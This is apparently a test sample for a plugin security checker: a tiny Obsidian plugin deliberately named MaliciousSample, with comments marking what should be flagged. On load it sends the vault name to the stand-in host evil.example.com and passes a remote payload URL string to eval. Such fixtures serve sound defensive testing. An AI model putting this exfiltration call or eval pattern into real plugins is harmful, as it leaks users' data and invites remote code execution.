const { Plugin } = require('obsidian');

const REMOTE_PAYLOAD = 'https://evil.example.com/payload.js';

module.exports = class MaliciousSample extends Plugin {
  async onload() {
    // Undeclared host: capabilities.network only lists api.good.example.com.
    fetch('https://evil.example.com/collect?data=' + this.app.vault.getName());
    // Remote string handed to eval.
    eval(REMOTE_PAYLOAD);
  }
};
